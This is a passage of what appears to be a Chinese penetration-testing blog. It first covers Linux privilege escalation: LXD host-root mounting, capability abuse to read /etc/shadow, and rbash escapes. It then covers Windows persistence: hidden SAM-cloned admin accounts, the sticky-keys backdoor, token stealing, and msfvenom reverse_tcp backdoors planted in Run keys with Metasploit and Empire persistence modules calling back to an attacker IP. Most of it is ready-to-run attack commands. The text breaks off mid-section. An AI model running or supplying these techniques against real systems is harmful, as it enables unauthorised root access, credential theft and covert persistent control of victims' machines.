<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># lxc init来初始化myimage，也就是alpine系统，并创建aaa账户，这里指的就是自己，通过c参数来配置安全提升策略为true，代表aaa可申请高级权限，命令如下：</span><br><span class="line">lxc init myimage aaa -c security.privileged=true</span><br><span class="line"># lxc config device命令用来配置设备，add把mydevice设备添加到了aaa账户中，disk是磁盘挂载，把本机/目录挂载到容器的/mnt下，recursive即是否递归，代表是否将所有子目录及所有文件进行挂载，命令如下：</span><br><span class="line">lxc config device add aaa mydevice disk source=/ path=/mnt/root recursive=true</span><br><span class="line"># 然后利用lxc start来启动刚刚添加的用户</span><br><span class="line">lxc start aaa</span><br><span class="line"># 最后利用lxc exec来执行程序，以aaa执行sh</span><br><span class="line">lxc exec aaa /bin/sh</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021714486.png" alt="image-20231002171403438"></p>
<p><strong>总结</strong></p>
<p>1，目标机安装了lxd容器，且需要利用的普通用户在lxd组。</p>
<p>2，下载alpine（轻量级的linux系统，大小在5m左右），传到目标机。</p>
<p>3，把alpine导入到容器中。</p>
<p>4，然后就是初始化alpine、添加当前的普通账户、配置挂载等操作。</p>
<p>5，配置好后启动即可。</p>
<p>上面操作和上一节的docker提权操作类似，都是通过apline来把宿主机的root目录挂载进行。只不过docker是通过v、i、t三个参数一条命令就可以，而lxd稍微麻烦，配置项多了几个。</p>
<p><strong>利用capability进行提权</strong></p>
<p>capability翻译为能力的意思，linux中能力的概念和suid类似，是用来让普通用户也可以做超级用户的工作，从而设置的一个机制，原来linux分的是普通用户和超级用户，后来加了能力，即赋予某某账号能力，这个账号有能力了，就可以去做事了。</p>
<p>capability可分割root权限，把root特权分割成不同的能力，然后给与普通用户不同的能力，每一种能力都代表着一种特权。下面是一些能力参考：</p>
<p>- CAP_CHOWN:修改文件属主的权限</p>
<p>- CAP_DAC_OVERRIDE:忽略文件的DAC访问限制</p>
<p>- CAP_DAC_READ_SEARCH:忽略文件读及目录搜索的DAC访问限制</p>
<p>- CAP_FOWNER：忽略文件属主ID必须和进程用户ID相匹配的限制</p>
<p>- CAP_FSETID:允许设置文件的setuid位</p>
<p>- CAP_KILL:允许对不属于自己的进程发送信号</p>
<p>- CAP_SETGID:允许改变进程的组ID</p>
<p>- CAP_SETUID:允许改变进程的用户ID</p>
<p>- CAP_SETPCAP:允许向其他进程转移能力以及删除其他进程的能力</p>
<p>- CAP_LINUX_IMMUTABLE:允许修改文件的IMMUTABLE和APPEND属性标志</p>
<p>- CAP_NET_BIND_SERVICE:允许绑定到小于1024的端口- CAP_NET_BROADCAST:允许网络广播和多播访问</p>
<p>- CAP_NET_ADMIN:允许执行网络管理任务</p>
<p>- CAP_NET_RAW:允许使用原始套接字</p>
<p>- CAP_IPC_LOCK:允许锁定共享内存片段</p>
<p>- CAP_IPC_OWNER:忽略IPC所有权检查</p>
<p>- CAP_SYS_MODULE:允许插入和删除内核模块</p>
<p>- CAP_SYS_RAWIO:允许直接访问&#x2F;devport,&#x2F;dev&#x2F;mem,&#x2F;dev&#x2F;kmem及原始块设备</p>
<p>- CAP_SYS_CHROOT:允许使用chroot()系统调用</p>
<p>- CAP_SYS_PTRACE:允许跟踪任何进程</p>
<p>- CAP_SYS_PACCT:允许执行进程的BSD式审计</p>
<p>- CAP_SYS_ADMIN:允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</p>
<p>- CAP_SYS_BOOT:允许重新启动系统</p>
<p>- CAP_SYS_NICE:允许提升优先级及设置其他进程的优先级</p>
<p>- CAP_SYS_RESOURCE:忽略资源限制</p>
<p>- CAP_SYS_TIME:允许改变系统时钟</p>
<p>- CAP_SYS_TTY_CONFIG:允许配置TTY设备</p>
<p>- CAP_MKNOD:允许使用mknod()系统调用</p>
<p>- CAP_LEASE:允许修改文件锁的FL_LEASE标志</p>
<p>capability和suid的区别在于：suid是针对某个用户给权限，而capability针对的是某个程序。在设置程序能力时，有三个选项可选：</p>
<p>1，inheritable，简称i，表示是否可继承。</p>
<p>2，permitted，简称p，表示是否允许使用。</p>
<p>3，effective，简称e，表示特权是否有效。</p>
<p>setcap命令用来设置能力，例如setcap cap_setuid+ep &#x2F;home&#x2F;demo&#x2F;python3，就表示home&#x2F;demo&#x2F;python3这个程序添加了setuid能力，即改变进程uid的能力，+ep就表示能力有效，且允许使用。</p>
<p><strong>capability测试</strong></p>
<p>setcap设置能力，getcat读取能力。</p>
<p>getcap通过r参数来读取指定目录下有能力的程序</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021714104.png" alt="image-20231002171450060"></p>
<p><strong>能力滥用导致的提权</strong></p>
<p>例如管理员要为python3程序设置超级权限给aaa用户，但没有用suid或sudo授权，而用的是capabilities，通过的是以下命令来设置的。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021715042.png" alt="image-20231002171531000"></p>
<p>因为root只想给aaa用户的python3能力，所以这里是将程序复制到了aaa用户下，如果直接设置bin下的python3程序，那么意味着任何用户都具有了相关能力。</p>
<p>这时获取了aaa账户，然后通过getcap命令发现python3具有setuid能力，且属主和属于都是root。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021715175.png" alt="image-20231002171544130"></p>
<p>那么普通用户aaa就可执行python3程序来导入os包执行系统命令，从而进行提权。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021716322.png" alt="image-20231002171636279"></p>
<p>同理，下面是perl程序的测试：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021717923.png" alt="image-20231002171736861"></p>
<p>如果是一些无法调用命令的程序，例如tar，则可以想办法读取密码文件，然后进行破解的方式来提权。</p>
<p>下面是tar的测试：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021717471.png" alt="image-20231002171756421"></p>
<p>这里赋予了cap_dac_read_search能力，即忽略文件读取和目录搜索的限制。</p>
<p>利用思路：压缩etc&#x2F;shadow文件，然后解压查看密码，进行破解</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021718131.png" alt="image-20231002171820063"></p>
<p>之后破解密码即可</p>
<p><strong>rbash绕过总结</strong></p>
<p>rbash是Restricted bash缩写，即受限制的bash。管理员可通过指定普通用户的bash为rbash，以此来限制相关操作。在rbash中，很多行为和命令都会被受到限制。</p>
<p>PS：这种确切说不属于提权，只是绕过rbash的限制，因为绕过后身份依旧是当前的普通账户。</p>
<p>这里测试aaa账户，使用root将aaa账户的bash改为rbash。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021718547.png" alt="image-20231002171835503"></p>
<p>然后切换为aaa账号，发现环境为rbash，shell环境是rbash</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021718742.png" alt="image-20231002171846681"></p>
<p><strong>vi绕过</strong></p>
<p>可以进入vi中执行set命令将shell改为&#x2F;bin&#x2F;sh，命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br><span class="line">:set shell=/bin/sh #回车</span><br><span class="line">:shell #回车</span><br><span class="line">cd /etc</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021719260.png" alt="image-20231002171912200"></p>
<p><strong>ed绕过</strong></p>
<p>ed也是一个文件编辑的命令，和vi类似，也是内联编辑模式，可输入命令，相关命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ed</span><br><span class="line">!&#x27;/bin/sh&#x27;</span><br><span class="line">cd /etc</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021719510.png" alt="image-20231002171926461"></p>
<p><strong>sh、bash、dash绕过</strong></p>
<p>默认情况下，可以在rbash中执行sh、bash、dash等命令，以此来绕过rbash。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021719991.png" alt="image-20231002171949941"></p>
<p>同理，如果这些命令不被运行，而cp允许，则可以把这些文件复制到当前目录运行，但是当&#x2F;符号不被允许的话，则复制到当前目录的文件是无法执行的。</p>
<p><strong>python、perl绕过</strong></p>
<p>可以尝试运行python和perl命令，如果允许执行，则可以用程序来调用bin&#x2F;bash绕过rbash，相关命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># python</span><br><span class="line">python3 -c &#x27;import os; os.system(&quot;/bin/sh&quot;);&#x27;</span><br><span class="line"># perl</span><br><span class="line">perl -e &#x27;system(&quot;/bin/sh&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/04/%E5%9B%BE%E7%89%87-127.png" alt="img"></p>
<p><strong>awk绕过</strong></p>
<p>awk命令通过BEGIN参数来指定执行前的语句，命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021720343.png" alt="image-20231002172014298"></p>
<p><strong>more绕过</strong></p>
<p>more命令读取文件内容时，可输入!’sh’进入sh来绕过rbash，这个需要当前目录下有文件可读，例如这里是在当前用户的家目录，则都会有.bashrc等文件，命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">more .bashrc</span><br><span class="line">!&#x27;sh&#x27;</span><br><span class="line">cd /</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>

<p>（特别的，需要读取的文件内容较长，否则直接会输出，不进入命令行）</p>
<p>这里以桌面的1.txt文件为例：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021720560.png" alt="image-20231002172035522"></p>
<p>类似于more的可利用命令，还有less、man等，用法类似。</p>
<p><strong>ssh登录绕过</strong></p>
<p>ssh进行远程登录时，可通过t参数来强制分配给自己伪终端，指定强制分配给自己bash，然后指定–noprofile参数。bash默认允许时会调用当前用户的bashrc等配置，该参数添加后，bash启动不会读取当前用户的默认配置。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh aaa@192.168.159.167 -t &quot;bash --noprofile&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021721244.png" alt="image-20231002172118186"></p>
<p><strong>漏洞提权</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/redcode-labs/Bashark">https://github.com/redcode-labs/Bashark</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/BeRoot">https://github.com/AlessandroZ/BeRoot</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p>
<p><strong>总结</strong></p>
<p>一般情况下建议的是先查找非漏洞的提权方法，如果没有，则再根据内核版本来查找相关的提权漏洞</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021721564.png" alt="image-20231002172139507"></p>
<p><a target="_blank" rel="noopener" href="https://cxsecurity.com/">https://cxsecurity.com/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://cjb12.github.io/project/2023/04/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88Linux%E7%AF%87%EF%BC%89/" data-id="cln8p3qxg0003d4tg4fnv7k8a" data-title="内网渗透之权限提升（Linux篇）" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-内网渗透之权限维持" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/project/2023/04/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="article-date">
  <time class="dt-published" datetime="2023-04-12T00:34:17.000Z" itemprop="datePublished">2023-04-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/project/2023/04/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">内网渗透之权限维持</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Windows-操作系统常见持久性后门"><a href="#Windows-操作系统常见持久性后门" class="headerlink" title="Windows 操作系统常见持久性后门"></a>Windows 操作系统常见持久性后门</h1><h2 id="Windows系统隐藏账户"><a href="#Windows系统隐藏账户" class="headerlink" title="Windows系统隐藏账户"></a>Windows系统隐藏账户</h2><p>该方法是通过建立隐藏账户，制作系统用户远程控制后门，维持目标Windows系统权限。制作方法跟步骤如下：</p>
<p>（1）在目标主机cmd中输入以下命令，创建一个名为whoami$的隐藏账户，并把该隐藏账户设置为管理员权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user whoami$ Liu78963 /add</span><br><span class="line">net localgroup administrators whoami$ /add</span><br></pre></td></tr></table></figure>

<p>执行<code>net user</code>命令，发现是看不到whoami$用户的</p>
<p>虽然上面<code>net user</code>看不见该隐藏用户，但是在控制面板和计算机管理的本地用户和组中，仍然是可以看的到该用户的：</p>
<p>为了更好地隐藏我们的后门账户，我们还要开启目标主机的远程桌面进行如下操作。</p>
<p>打开注册表编辑器，找到<code>HKEY_LOCAL_MACHINE\SAM\SAM</code>，单机右建，选择“权限”，把Administrator用户的权限，设置成“完全控制”权限，然后关闭注册表编辑器，再次打开即可。</p>
<p>然后，在注册表编辑器的<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>处，点击Administrator用户，在左侧找到和在右边显示的键值的类型一项“0x1f4”相同的目录名，也就是箭头所指目录“000001F4”：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021624044.png" alt="image-20231002162407975"></p>
<p>复制<code>000001F4</code>目录中的F键的值：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021624718.png" alt="image-20231002162423630"></p>
<p>然后找到与隐藏账户whoami$右边类型的键值“0x3e9”相同的目录名，也就是。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021624801.png" alt="image-20231002162436740"></p>
<p>然后将<code>000001F4</code>的F值粘贴到<code>000003E9</code>的F值中，点击确定：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021624891.png" alt="image-20231002162448810"></p>
<p>然后从注册表中右键导出<code>000003E9</code>和whoami$，并删除whoami$用户 <code>net user whoami$ /del</code>：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021625703.png" alt="image-20231002162504620"></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021625306.png" alt="image-20231002162518224"></p>
<p>此时，查看注册表以及本地用户和组或者控制面板，whoami$用户已经没有了：</p>
<p>最后，将刚才导出的两个后缀为.reg的注册表项导入注册表中：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021625486.png" alt="image-20231002162550401"></p>
<p>这样我们的隐藏账户whoami$就创建好了。现在，不管你是在命令提示符下输入 net user 或者在系统用户管理界面都是看不到whoami$这个账户的，只有在注册表中才能看得到。</p>
<h2 id="Shift-粘滞键后门"><a href="#Shift-粘滞键后门" class="headerlink" title="Shift 粘滞键后门"></a>Shift 粘滞键后门</h2><p>如果你在电脑上连按五次shift键，你就会发现电脑屏幕上弹出了一个叫做“粘滞键”的程序</p>
<p>即使在没有登录进系统之前，连按五次shift键也可以弹出这个程序</p>
<p>如果我们知道了这个程序的绝对路径，那么我们就可以将cmd.exe伪装成这个粘滞键程序，当我们连按五次shift键时，便会弹出一个CMD命令行窗口，那么我们就可以无需登录进系统便可以控制目标主机了。</p>
<p>粘滞键程序名称为“sethc.exe”，其路径为“c:\windows\system32\sethc.exe”。利用粘滞键做后门是一种比较常见的持续控制方法。其基本流程如下：</p>
<ul>
<li>首先，我们手动或利用工具，找到sethc.exe将其删除或改名为sethc.exe.bak，接着将cmd.exe程序复制一个副本，并命名为“sethc.exe”。</li>
<li>最后，重启计算机再次按下5次Shift键时，就会弹出CMD界面，后门制作成功。</li>
</ul>
<p>补充：</p>
<p>使用msf控制一台win7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ms17-010(永恒之蓝)</span><br><span class="line">search ms17-010</span><br><span class="line">use 3</span><br><span class="line">options</span><br><span class="line">set rhost 192.168.137.135</span><br><span class="line">run </span><br><span class="line"></span><br><span class="line">search ms17-010</span><br><span class="line">use 0</span><br><span class="line">set rhost 192.168.137.135</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">解决乱码：chcp 65001</span><br></pre></td></tr></table></figure>

<h3 id="（1）手动制作"><a href="#（1）手动制作" class="headerlink" title="（1）手动制作"></a>（1）手动制作</h3><p>在目标主机上执行如下命令即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd c:\windows\system32  </span><br><span class="line">move sethc.exe sethc.exe.bak   // 将sethc.exe重命名</span><br><span class="line">copy cmd.exe sethc.exe       // 将一个cmd.exe副本保存伪装成sethc.exe</span><br></pre></td></tr></table></figure>

<p>此时，我们打开目标主机的远程桌面，连续按下五次shift键，便可以看到目标主机屏幕上成功弹出了一个CMD窗口</p>
<p>该cmd是以system权限运行的，接下来我们就可以无需知道登录密码，无需登录，直接对目标主机执行各种高权限的操作了，也完全可以新建一个高权限用户直接登录进入系统，是不是很有意思？</p>
<p>但是，在一些做了防护的主机上（原版win7），即使是SYSTEM权限也是无法修改sethc.exe的：</p>
<p>只有TrustedInstaller权限才可以，这时，我们就要先模拟一个TrustedInstaller权限的令牌获取TrustedInstaller权限，然后再执行上述操作。我们的思路如下：</p>
<p>当我们启动TrustedInstaller服务时会启动进程TrustedInstaller.exe，该程序的权限为NT SERVICE\TrustedInstaller，那么我们就可以窃取该进程的令牌。</p>
<p>首先进入shell启动TrustedInstaller服务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe start TrustedInstaller       # 先进入shell启动TrustedInstaller服务</span><br></pre></td></tr></table></figure>

<p>然后执行如下即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">ps      # 找到TrustedInstaller的进程PID，这里为3476</span><br><span class="line">steal_token &lt;PID&gt;      # 从该进程中窃取令牌</span><br><span class="line">getuid   </span><br></pre></td></tr></table></figure>

<p>此时便可以对sethc.exe进行任何操作了</p>
<h3 id="（2）Empire-下的利用"><a href="#（2）Empire-下的利用" class="headerlink" title="（2）Empire 下的利用"></a>（2）Empire 下的利用</h3><p>可以使用Empire的 lateral_movement&#x2F;invoke_wmi_debugger模块自动完成以上操作。</p>
<p>该模块将为指定的目标（SETHC.exe、Utilman.exe、OSK.exe、DealActudi.exe或Max .exe）来设置调试器，使之成为选择的目标（即CMD.exe）或阶段程序。这类似于持久性&#x2F;调试器模块，但具有远程执行而不是本地执行功能。</p>
<p>补充：</p>
<p>Empire的使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">listeners</span><br><span class="line">uselistener http</span><br><span class="line">info</span><br><span class="line">set Host 192.168.137.136</span><br><span class="line">set Name shiyan</span><br><span class="line">set Port 7000</span><br><span class="line">execute</span><br><span class="line"></span><br><span class="line">back</span><br><span class="line">list(kill shiyan)</span><br><span class="line"></span><br><span class="line">launcher powershell shiyan</span><br><span class="line"></span><br><span class="line">agents</span><br><span class="line">interact Name</span><br></pre></td></tr></table></figure>

<p>假设我们已经在Empire上面获得了目标主机的session，我们可以通过该模块在目标主机上设置粘滞键后门：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usemodule lateral_movement/invoke_wmi_debugger</span><br><span class="line">set ComputerName &lt;主机名/IP&gt;</span><br><span class="line">set TargetBinary sethc.exe</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>

<h2 id="注册表键后门"><a href="#注册表键后门" class="headerlink" title="注册表键后门"></a>注册表键后门</h2><p>该方法是通过将需要执行的后门程序或者攻击脚本路径添加到注册表的自动启动项中，从而实现目标主机启动或登录时便会执行后门程序使我们获得其控制权限。</p>
<p>一般我们使用注册表的如下位置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run   // 开启时启动程序</span><br><span class="line">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit   // 登录时启动程序</span><br></pre></td></tr></table></figure>

<h3 id="（1）手动制作-1"><a href="#（1）手动制作-1" class="headerlink" title="（1）手动制作"></a>（1）手动制作</h3><p>首先我们制作一个metasploit后门：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lport=4444 lhost=192.168.137.136 -f exe -o backdoor.exe</span><br></pre></td></tr></table></figure>

<p>将该后门程序上传到目标主机的C:\Windows\System32目录中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /root/backdoor.exe C:\\Windows\\System32</span><br></pre></td></tr></table></figure>

<p>然后在目标主机的meterpreter执行如下命令注册表进行操作制作后门：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v backdoor -d &#x27;C:\windows\system32\backdoor.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v backdoor   #查看键值</span><br></pre></td></tr></table></figure>

<p>此时我们重新开一个metasploit监听，然后输入“shutdown -r -t 0”命令让目标主机重启，当目标主机重新启动后便会启动执行backdoor.exe后门程序，我们攻击机的新开的metasploit监听上就会成功上线：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.137.136</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>我们还可以操作注册表的Userinit键：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</span><br></pre></td></tr></table></figure>

<p>让目标主机在用户进行登陆时，winlogon运行指定的后门程序。</p>
<p>除此之外还有以下可利用的注册表键：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce // 只会在开机时启动一次</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices   </span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br></pre></td></tr></table></figure>

<h3 id="（2）Metasploit-下的利用"><a href="#（2）Metasploit-下的利用" class="headerlink" title="（2）Metasploit 下的利用"></a>（2）Metasploit 下的利用</h3><p>Metasploit通过使用Meterpreter脚本和后渗透模块来支持通过注册表的持久性。Meterpreter脚本将以VBS脚本的形式创建一个有效payload，该payload将被上传到目标主机的磁盘上，并创建一个注册表项，该注册表项将在用户登录期间循环运行该有效负载。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run exploit/windows/local/persistence -U -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r 192.168.137.136</span><br><span class="line">run exploit/windows/local/persistence -X -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r 192.168.137.136</span><br><span class="line"></span><br><span class="line">run persistence -U -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r 192.168.137.136</span><br><span class="line">run persistence -X -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r 192.168.137.136</span><br></pre></td></tr></table></figure>

<ul>
<li>-U指定启动方式为用户登录时自启动</li>
<li>-X指定启动的方式为开机自启动</li>
<li>-P 指定所使用的payload</li>
<li>-i不断尝试反向连接的时间间隔，我们这里设置的是5秒钟执行一次</li>
<li>–r指定攻击者的ip</li>
<li>-p 指定攻击者监听的端口</li>
</ul>
<p>生成后门后，只要目标主机重启或者登录，我们将在特定的时间间隔保持meterpreter会话了。</p>
<p>（这部分有问题，文章给的34，persistence报错，换成12后，命令无回显，无法成功执行）</p>
<h3 id="（3）Empire-下的利用"><a href="#（3）Empire-下的利用" class="headerlink" title="（3）Empire 下的利用"></a>（3）Empire 下的利用</h3><p>在Empire上面有一个persistence&#x2F;userland&#x2F;registry后渗透模块，可以自动帮我们完成上面手动创建注册表后门的任务。</p>
<p>假设我们已经在Empire上面获得了一个目标主机的session，我们可以通过设置该模块在目标主机上创建注册表后门：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usemodule persistence/userland/registry</span><br><span class="line">set Listener &lt;监听名&gt;</span><br><span class="line">set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">set Agent &lt;Agent&gt;</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>

<p><strong>注意：杀毒软件针对此类注册表后门有专门的查杀机制。</strong></p>
<h2 id="Windows-计划任务后门"><a href="#Windows-计划任务后门" class="headerlink" title="Windows 计划任务后门"></a>Windows 计划任务后门</h2><p>计划任务可以让目标主机在特定的时间执行我们预先准备的后门程序从而使我们获得目标系统的控制权。计划任务的持久化技术可以手动实现，也可以自动实现。有效负载可以从磁盘或远程位置执行，它们可以是可执行文件、powershell脚本或scriptlet的形式。</p>
<h3 id="（1）利用-at-命令"><a href="#（1）利用-at-命令" class="headerlink" title="（1）利用 at 命令"></a>（1）利用 at 命令</h3><p>at 命令是Windows自带的用于创建计划任务的命令，但是他主要工作在Windows Server 2008之前版本的操作系统中。我们可以通过at命令通过跳板机在目标主机DC上创建计划任务，让计算机在指定的时间执行木马程序，从而获得对内网目标主机的控制。</p>
<p>1.首先在目标主机上传metasploit生成的后门程序（位于注册表键后门-&gt;手动注册部分）</p>
<p>2.然后进入目标主机的shell使用net time命令确定目标主机的当前时间：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time</span><br></pre></td></tr></table></figure>

